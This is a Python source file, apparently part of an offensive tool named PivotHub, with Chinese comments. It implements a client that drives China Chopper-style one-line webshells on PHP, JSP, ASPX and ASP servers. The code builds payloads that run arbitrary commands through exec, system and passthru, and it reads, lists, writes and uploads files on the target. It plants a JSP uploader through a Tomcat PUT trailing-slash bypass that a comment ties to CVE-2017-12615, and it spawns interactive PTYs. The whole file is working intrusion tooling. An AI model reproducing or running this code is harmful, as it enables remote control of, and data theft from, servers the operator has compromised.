"""HTTP 一句话马会话驱动（菜刀/蚁剑式 POST 协议）。

语言与请求形态（与原型生成器/演示数据一致）：
- PHP  一句话马：POST 字段=连接密码，值为 PHP 代码（@eval($_POST['密码'])）
- JSP  一句话马：POST 字段 cmd = shell 命令（Runtime.exec("/bin/sh","-c",cmd)）
- ASPX 一句话马：POST 字段 pass = shell 命令（cmd.exe /c 参数）
- ASP  一句话马：POST 字段=连接密码，值为 VBScript 片段（尽力而为）
- PHP/ASP 自定义 AES 马：二期协议（当前诚实报不支持，前端回退）

所有回显以 [[PIVOTHUB_EOF]] 标记收尾：标记缺失即视为执行失败（函数被禁/拦截）。
"""

from __future__ import annotations

import time
from typing import Optional
from urllib import parse as _uparse
from urllib import request as _ureq

from .base import ExecResult, FileEntry, SessionBase, SessionError, b64e, ls_error_text, parse_ls_output

EOF_MARK = "[[PIVOTHUB_EOF]]"
LINUX = "linux"
WINDOWS = "windows"


def lang_of(shell_type: str, url: str = "") -> str:
    t = (shell_type or "") + " " + (url or "").lower()
    if "php" in t.lower():
        return "php"
    if "jsp" in t.lower():
        return "jsp"
    if "aspx" in t.lower():
        return "aspx"
    if "asp" in t.lower():
        return "asp"
    if url.endswith(".php"):
        return "php"
    if url.endswith((".jsp", ".do")):
        return "jsp"
    if url.endswith(".aspx"):
        return "aspx"
    if url.endswith(".asp"):
        return "asp"
    return "unknown"


class HttpShellSession(SessionBase):
    kind = "http-shell"

    def __init__(
        self,
        url: str,
        pwd: str = "",
        encoder: str = "none",
        shell_type: str = "",
        platform: str = LINUX,
        timeout: float = 10.0,
    ) -> None:
        self.url = url
        self.pwd = pwd or "cmd"
        self.encoder = encoder or "none"
        self.shell_type = shell_type
        self.lang = lang_of(shell_type, url)
        self.platform = platform
        self.timeout = timeout
        if self.lang == "unknown":
            raise SessionError(f"无法识别的 WebShell 类型: {shell_type!r} ({url})")
        if self.lang == "php" and self.encoder.lower().startswith("aes"):
            # 自定义 AES 马协议：一期后续接入（诚实报不支持，不伪造成功）
            raise SessionError("自定义 AES 加密马协议将在后续版本接入；请使用一句话马会话")

    # ---------------- 传输 ----------------

    def _post(self, fields: dict[str, str], timeout: Optional[float] = None) -> tuple[int, int, str]:
        data = _uparse.urlencode(fields).encode("utf-8")
        req = _ureq.Request(self.url, data=data, method="POST", headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (PivotHub)",
        })
        start = time.perf_counter()
        try:
            with _ureq.urlopen(req, timeout=timeout or self.timeout) as resp:
                body = resp.read(1024 * 1024).decode("utf-8", "replace")
                status = resp.status
        except Exception as e:  # 网络层失败统一抛 SessionError
            raise SessionError(f"HTTP 请求失败: {e}") from e
        ms = int((time.perf_counter() - start) * 1000)
        return status, ms, body

    # ---------------- 连通性 ----------------

    def test(self) -> ExecResult:
        try:
            if self.lang == "php":
                status, ms, body = self._post({self.pwd: f'echo "{EOF_MARK}";'})
            else:
                status, ms, body = self._post({self._cmd_field(): "echo ok"})
        except SessionError as e:
            return ExecResult(ok=False, error=str(e))
        ok = EOF_MARK in body or "ok" in body.lower()
        return ExecResult(ok=ok, output=body.strip()[:200], ms=ms)

    def _cmd_field(self) -> str:
        return "cmd" if self.lang == "jsp" else ("pass" if self.lang == "aspx" else self.pwd)

    # ---------------- 命令执行 ----------------

    def exec(self, cmd: str, timeout: float = 15.0) -> ExecResult:
        if self.lang == "php":
            payload = self._php_exec_payload(cmd)
            fields = {self.pwd: payload}
        elif self.lang == "jsp":
            fields = {"cmd": cmd}
        elif self.lang == "aspx":
            fields = {"pass": cmd}
        elif self.lang == "asp":
            fields = {self.pwd: self._asp_exec_snippet(cmd)}
        else:
            return ExecResult(ok=False, error="未知 WebShell 语言")
        try:
            status, ms, body = self._post(fields, timeout=timeout + 5)
        except SessionError as e:
            return ExecResult(ok=False, error=str(e))
        return self._parse_exec(body, ms)

    def _parse_exec(self, body: str, ms: int) -> ExecResult:
        if self.lang in ("jsp", "aspx", "asp"):
            # 这些形态直接回显命令输出：空回显是合法的（重定向、touch 等无输出命令），
            # 请求本身失败会走 SessionError，因此这里按成功处理。
            return ExecResult(ok=True, output=body.strip(), ms=ms)
        if EOF_MARK not in body:
            return ExecResult(
                ok=False, ms=ms,
                error="回显缺失 EOF 标记：命令执行函数可能被禁用或被 WAF 拦截",
                output=body.strip()[:400],
            )
        out = body.split(EOF_MARK)[0]
        if "PIVOTHUB_NO_FUNC" in out:
            return ExecResult(ok=False, ms=ms, error="目标 PHP 禁用了 exec/shell_exec/system/passthru")
        return ExecResult(ok=True, output=out.rstrip("\r\n"), ms=ms)

    @staticmethod
    def _php_exec_payload(cmd: str) -> str:
        return (
            '$c=base64_decode("' + b64e(cmd) + '");'
            'if(function_exists("exec")){@exec($c." 2>&1",$o);echo implode("\\n",$o);}'
            'elseif(function_exists("shell_exec")){echo @shell_exec($c." 2>&1");}'
            'elseif(function_exists("system")){@system($c." 2>&1");}'
            'elseif(function_exists("passthru")){@passthru($c." 2>&1");}'
            'else{echo "PIVOTHUB_NO_FUNC";}'
            f'echo "\\n{EOF_MARK}";'
        )

    @staticmethod
    def _asp_exec_snippet(cmd: str) -> str:
        # 经典 ASP 一句话（eval request）执行命令的 VBS 片段（尽力而为）
        safe = cmd.replace('"', '""')
        return (
            'Set w=CreateObject("WScript.Shell"):Set e=w.Exec("cmd /c ' + safe + '")'
            ':Response.Write(e.StdOut.ReadAll)'
        )

    # ---------------- 文件操作 ----------------

    def list_dir(self, path: str) -> list[FileEntry]:
        if self.lang == "php":
            payload = (
                '$d=base64_decode("' + b64e(path) + '");'
                'if(!@is_dir($d)){echo "PIVOTHUB_NOT_DIR";}'
                'else{foreach(@scandir($d) as $f){if($f==="."||$f==="..")continue;'
                '$p=rtrim($d,"/")."/".$f;'
                '@printf("%s\\t%s\\t%s\\t%s\\n",@is_dir($p)?"d":"-",@filesize($p),'
                '@date("Y-m-d H:i",@filemtime($p)),base64_encode($f));}}'
                f'echo "{EOF_MARK}";'
            )
            raw = self._php_op(payload)
            if "PIVOTHUB_NOT_DIR" in raw:
                raise SessionError(f"目录不存在或不可读: {path}")
            entries = []
            for line in raw.splitlines():
                parts = line.split("\t")
                if len(parts) != 4:
                    continue
                flag, size, mtime, nb64 = parts
                from .base import b64d

                try:
                    name = b64d(nb64).decode("utf-8", "replace")
                except Exception:
                    continue
                entries.append(FileEntry(
                    name=name, is_dir=(flag == "d"),
                    size=int(size) if size.isdigit() else 0, mtime=mtime,
                ))
            if not entries and raw.strip():
                # 非空但解析不出条目 → 目标侧报错（权限/路径），如实抛出不静默吞掉
                raise SessionError(f"列目录失败: {raw.strip().splitlines()[0][:200]}")
            return entries
        # JSP/ASPX：退化为 exec 解析（dir/ls 输出），保证能力可用
        cmd = ("dir /a /-c " if self.platform == WINDOWS else "ls -la --time-style=+%Y-%m-%d\\ %H:%M ") + _q(path)
        res = self.exec(cmd + " 2>&1")  # 合并 stderr：路径不存在时才能拿到错误原因
        if not res.ok:
            raise SessionError(res.error or "列目录失败")
        entries = parse_ls_output(res.output)
        if not entries:
            err = ls_error_text(res.output)
            if err:
                raise SessionError(f"列目录失败: {err}")
        return entries

    def read_file(self, path: str, max_bytes: int = 512 * 1024) -> str:
        if self.lang == "php":
            payload = (
                '$f=base64_decode("' + b64e(path) + '");'
                '$h=@fopen($f,"rb");if(!$h){echo "PIVOTHUB_READ_FAIL";}'
                'else{echo base64_encode(@fread($h,' + str(max_bytes) + '));@fclose($h);}'
                f'echo "\\n{EOF_MARK}";'
            )
            raw = self._php_op(payload)
            if "PIVOTHUB_READ_FAIL" in raw:
                raise SessionError(f"读取失败（不存在或无权限）: {path}")
            from .base import b64d

            return b64d(raw.strip().splitlines()[0] if raw.strip() else "").decode("utf-8", "replace")
        res = self.exec(("type " if self.platform == WINDOWS else "cat ") + _q(path))
        if not res.ok:
            raise SessionError(res.error or "读取失败")
        return res.output

    def write_file(self, path: str, content: str) -> None:
        if self.lang == "php":
            payload = (
                '$r=@file_put_contents(base64_decode("' + b64e(path) + '"),'
                'base64_decode("' + b64e(content) + '"));'
                'echo ($r===false?"PIVOTHUB_WRITE_FAIL":"PIVOTHUB_WRITE_OK");'
                f'echo "\\n{EOF_MARK}";'
            )
            raw = self._php_op(payload)
            if "PIVOTHUB_WRITE_FAIL" in raw:
                raise SessionError(f"写入失败（目录不可写）: {path}")
            return
        if self.platform == WINDOWS:
            raise SessionError("该驱动在 Windows 目标上暂不支持经 exec 写文件")
        res = self.exec(f"echo {b64e(content)} | base64 -d > {_q(path)}")
        if not res.ok:
            raise SessionError(res.error or "写入失败")

    def write_file_b64(self, path: str, b64: str, append: bool = False) -> None:
        """二进制安全写入（base64 密文直达目标侧解码）。"""
        if self.lang == "php":
            flag = "FILE_APPEND" if append else "0"
            payload = (
                '$r=@file_put_contents(base64_decode("' + b64e(path) + '"),'
                'base64_decode("' + b64 + '"),' + flag + ');'
                'echo ($r===false?"PIVOTHUB_WRITE_FAIL":"PIVOTHUB_WRITE_OK");'
                f'echo "\\n{EOF_MARK}";'
            )
            raw = self._php_op(payload, timeout=90)
            if "PIVOTHUB_WRITE_FAIL" in raw:
                raise SessionError(
                    f"写入失败（目录不可写）: {path} · {raw.strip()[:200]}")
            return
        if self.lang == "jsp":
            op = ">>" if append else ">"
            res = self.exec(f"echo {b64} | base64 -d {op} {_q(path)}")
            if not res.ok:
                raise SessionError(res.error or "二进制写入失败")
            return
        raise SessionError("该目标语言暂不支持二进制写入")

    # ---- JSP 原始字节上传器：PUT 一个流式落盘 JSP（Tomcat PUT 形态），
    #      随后以 octet-stream 裸体分块 POST，绕开表单体积/单参数长度限制 ----

    RAW_UPLOADER_JSP = (
        '<%@ page import="java.io.*" %><%'
        'String p = request.getParameter("p");'
        'if (p != null) {'
        ' InputStream in = request.getInputStream();'
        ' OutputStream f = new FileOutputStream(p, "1".equals(request.getParameter("a")));'
        ' byte[] b = new byte[8192]; int n;'
        ' while ((n = in.read(b)) > 0) f.write(b, 0, n);'
        ' f.close(); out.print("OK");'
        '} %>'
    )

    def _ensure_raw_uploader(self) -> str:
        if getattr(self, "_up_url", None):
            return self._up_url
        import uuid

        base = self.url.rsplit("/", 1)[0]
        name = "up" + uuid.uuid4().hex[:6] + ".jsp"
        put_url = base + "/" + name + "/"  # 尾斜杠绕过 readonly（CVE-2017-12615 形态）
        req = _ureq.Request(put_url, data=self.RAW_UPLOADER_JSP.encode("utf-8"), method="PUT",
                            headers={"User-Agent": "Mozilla/5.0 (PivotHub)"})
        try:
            with _ureq.urlopen(req, timeout=self.timeout + 10) as resp:
                if resp.status not in (200, 201, 204):
                    raise SessionError(f"上传器写入被拒绝（HTTP {resp.status}）")
        except SessionError:
            raise
        except Exception as e:
            raise SessionError(f"上传器写入失败: {e}") from e
        self._up_url = base + "/" + name
        return self._up_url

    def upload_file(self, path: str, data: bytes, chunk_size: int = 1_400_000) -> int:
        if self.lang != "jsp":
            return super().upload_file(path, data, chunk_size)
        from urllib.parse import quote as _q2

        url = self._ensure_raw_uploader()
        total = 0
        first = True
        i = 0
        while True:
            chunk = data[i:i + chunk_size]
            req = _ureq.Request(
                url + "?p=" + _q2(path, safe="") + "&a=" + ("0" if first else "1"),
                data=chunk, method="POST",
                headers={"Content-Type": "application/octet-stream",
                         "User-Agent": "Mozilla/5.0 (PivotHub)"})
            try:
                with _ureq.urlopen(req, timeout=180) as resp:
                    body = resp.read(64).decode("utf-8", "replace")
            except Exception as e:
                raise SessionError(f"分块上传失败: {e}") from e
            if "OK" not in body:
                raise SessionError("上传器回显异常（未确认落盘）")
            total += len(chunk)
            first = False
            i += chunk_size
            if i >= len(data):
                break
        return total

    def _php_op(self, payload: str, timeout: float | None = None) -> str:
        status, ms, body = self._post({self.pwd: payload}, timeout=timeout or (self.timeout + 10))
        if EOF_MARK not in body:
            raise SessionError("文件操作回显异常（EOF 标记缺失）")
        return body.split(EOF_MARK)[0]

    # ---------------- PTY 探测（终端固化核心） ----------------

    def pty_probe(self, inner_cmd: str, timeout: float = 15.0) -> ExecResult:
        """在目标侧真实拉起 PTY 并在其内执行 inner_cmd，返回 PTY 内真实回显。"""
        if self.platform == WINDOWS:
            raise SessionError("Windows 目标暂无 pty 探测（ConPTY 将在后续版本接入）")
        inner_b64 = b64e(inner_cmd)
        candidates = [
            # python pty.spawn：给子进程真实控制终端（最通用）
            'python3 -c \'import pty,base64;pty.spawn(["/bin/sh","-c",base64.b64decode("'
            + inner_b64 + '").decode()])\' 2>&1',
            'python -c \'import pty,base64;pty.spawn(["/bin/sh","-c",base64.b64decode("'
            + inner_b64 + '").decode()])\' 2>&1',
            # script 伪终端备选（util-linux）
            '/usr/bin/script -qec "sh -c \'echo ' + inner_b64 + '|base64 -d|sh\'" /dev/null 2>&1',
        ]
        last = ExecResult(ok=False, error="无可用 PTY 拉起工具")
        for probe_cmd in candidates:
            res = self.exec(probe_cmd, timeout=timeout)
            if res.ok and ("/dev/pts/" in res.output or "/dev/tty" in res.output):
                return res
            if res.ok:
                last = res
        return last


def _q(path: str) -> str:
    """shell 单引号转义。"""
    return "'" + path.replace("'", "'\\''") + "'"
